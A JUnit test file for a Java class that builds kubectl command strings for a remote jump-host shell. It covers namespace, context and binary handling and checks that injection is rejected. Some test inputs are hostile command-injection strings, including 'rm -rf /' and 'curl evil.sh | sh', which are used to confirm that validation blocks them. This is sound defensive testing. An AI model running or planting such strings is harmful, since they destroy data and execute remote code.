package io.kubastion.kubectl;

import io.kubastion.config.KubastionProperties;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * These strings end up inside a remote shell. The validation is not fussiness:
 * it is the only thing between a configuration file and arbitrary command
 * execution on the jump host.
 */
class KubectlCommandsTest {

    private KubectlCommands commands(String binary, String namespace, String context) {
        return new KubectlCommands(new KubastionProperties(
                new KubastionProperties.Terminal("", List.of()),
                new KubastionProperties.Kubectl(binary, namespace, context),
                new KubastionProperties.Monitor(3, 15, 2)));
    }

    @Test
    void buildsTheCommandWithTheNamespace() {
        String command = commands("kubectl", "production", "").getPods();

        assertTrue(command.startsWith("kubectl -n production get pods -o jsonpath="), command);
    }

    @Test
    void thePodListIsCompactRatherThanFullJson() {
        // -o json drags managedFields and the whole spec through the terminal,
        // which is what made real clusters come back truncated.
        String command = commands("kubectl", "demo", "").getPods();

        assertFalse(command.contains("-o json "), command);
        assertFalse(command.endsWith("-o json"), command);
        assertTrue(command.contains("-o jsonpath="), command);
        assertTrue(command.contains("--allow-missing-template-keys=true"), command);
        // Records end in @@ so terminal wrapping cannot split them.
        assertTrue(command.contains("@@"), command);
    }

    @Test
    void includesTheContextWhenSet() {
        String command = commands("kubectl", "demo", "cluster-a").getPods();

        assertTrue(command.contains("--context=cluster-a"), command);
    }

    @Test
    void omittingTheContextLeavesNoEmptyFlag() {
        String command = commands("kubectl", "demo", "  ").getPods();

        assertFalse(command.contains("--context"), command);
    }

    @Test
    void anEmptyNamespaceRunsAgainstTheSessionDefault() {
        // No namespace configured means no -n at all — exactly what you get by
        // typing `kubectl get pods` yourself in the session you logged into.
        String command = commands("kubectl", "", "").getPods();

        assertTrue(command.startsWith("kubectl get pods -o jsonpath="), command);
        assertFalse(command.contains(" -n "), command);
    }

    @Test
    void aBlankNamespaceIsTreatedAsEmpty() {
        assertFalse(commands("kubectl", "   ", "").getPods().contains(" -n "));
    }

    @Test
    void acceptsAFullPathForTheBinary() {
        String command = commands("/usr/local/bin/kubectl", "demo", "").getPods();

        assertTrue(command.startsWith("/usr/local/bin/kubectl "), command);
    }

    @Test
    void rejectsANamespaceTryingToInjectCommands() {
        assertThrows(IllegalArgumentException.class,
                () -> commands("kubectl", "demo; rm -rf /", ""));
    }

    @Test
    void rejectsANamespaceWithSpaces() {
        assertThrows(IllegalArgumentException.class,
                () -> commands("kubectl", "demo prod", ""));
    }

    @Test
    void rejectsANamespaceWithQuotes() {
        assertThrows(IllegalArgumentException.class,
                () -> commands("kubectl", "demo\"$(whoami)\"", ""));
    }

    @Test
    void rejectsABinaryWithShellMetacharacters() {
        assertThrows(IllegalArgumentException.class,
                () -> commands("kubectl; curl evil.sh | sh", "demo", ""));
    }

    @Test
    void rejectsAMissingBinary() {
        // The binary must always be present; the namespace, by contrast, is
        // optional (empty = the session default).
        assertThrows(IllegalArgumentException.class, () -> commands("", "demo", ""));
        assertThrows(IllegalArgumentException.class, () -> commands("   ", "demo", ""));
    }

    @Test
    void rejectsAnInvalidContext() {
        assertThrows(IllegalArgumentException.class,
                () -> commands("kubectl", "demo", "ctx && whoami"));
    }
}
